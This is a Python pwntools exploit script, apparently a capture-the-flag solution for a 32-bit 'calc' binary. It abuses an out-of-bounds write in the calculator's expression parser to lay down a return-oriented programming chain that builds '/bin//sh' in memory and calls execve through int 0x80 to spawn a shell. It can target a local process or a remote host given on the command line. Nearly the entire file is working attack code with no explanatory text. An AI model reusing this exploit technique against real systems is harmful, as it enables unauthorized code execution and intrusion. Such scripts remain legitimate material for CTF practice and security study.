#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('calc')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *calc+116
b *calc+186
b *parse_expr+268
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()


def writeDword(i, dword):
    offset = 0x167
    payload = f"{offset + i}+1+00+{dword}+".encode()
    io.sendline(payload)


def solve():

    ropchain = [
        0x080701aa, # pop edx ; ret
        0x080ec060, # @ .data
        0x0805c34b, # pop eax ; ret
        u32(b"/bin"),
        0x0809b30d, # mov dword ptr [edx], eax ; ret
        0x080701aa, # pop edx ; ret
        0x080ec064, # @ .data + 4
        0x0805c34b, # pop eax ; ret
        u32(b"//sh"),
        0x0809b30d, # mov dword ptr [edx], eax ; ret
        0x080701aa, # pop edx ; ret
        0x080ec068, # @ .data + 8
        0x080550d0, # xor eax, eax ; ret
        0x0809b30d, # mov dword ptr [edx], eax ; ret
        0x080481d1, # pop ebx ; ret
        0x080ec060, # @ .data
        0x080701d1, # pop ecx ; pop ebx ; ret
        0x080ec068, # @ .data + 8
        0x080ec060, # padding without overwrite ebx
        0x080701aa, # pop edx ; ret
        0x080ec068, # @ .data + 8
        0x080550d0, # xor eax, eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x0807cb7f, # inc eax ; ret
        0x08049a21, # int 0x80
    ]


    for i, j in enumerate(ropchain):
        writeDword(i, j)

    io.sendline(b"triggered!")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()



